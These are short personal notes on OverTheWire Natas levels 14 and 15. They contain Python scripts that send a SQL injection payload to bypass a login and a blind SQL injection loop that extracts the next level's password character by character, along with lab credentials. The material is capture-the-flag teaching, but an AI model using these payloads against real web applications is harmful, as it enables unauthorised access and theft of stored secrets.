
2024-07-18 20:49

Source: #overthewire #natas #web 

Tags: [[Injection]]
## Natas 14

```
import requests
username = 'natas14'
password = 'z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ'

url = 'http://natas14.natas.labs.overthewire.org/?debug=true'
sessions = requests.Session()

response = sessions.post(url,data={ "username" : 'aaam" OR 1=1 #' , "password" : "mango"},auth = (username,password))

print(response.text)
```
here on seeing the source code we see that we have a `debug` parameter that will show us the query that is made on the DB 

`#`  - comment the rest of the query 

injecting the following in the username will give the pass
```
'anything" OR 1=1 #'
```
## Natas 15

[[BlindSQL]] 

- the anything character or the wild-card character in a SQL `like` statement is `%`
- putting `BINARY` right before the field in the Select statement we'll make that field case sensitive

```
import requests
import string
characters = string.ascii_letters + "0123456789"

username = 'natas15'
password = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'

url = 'http://natas15.natas.labs.overthewire.org/?debug=true'
sessions = requests.Session()
seen = list()

while (True):
    for ch in characters:
        print("trying character with password" , "".join(seen) + ch)

        response = sessions.post(url,data={ "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen) + ch +'%" #'},auth = (username,password))

        content = response.text
        if "user exists" in content:
            seen.append(ch)
            break
```
### References
https://www.youtube.com/watch?v=krp0qCOAnFE&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=12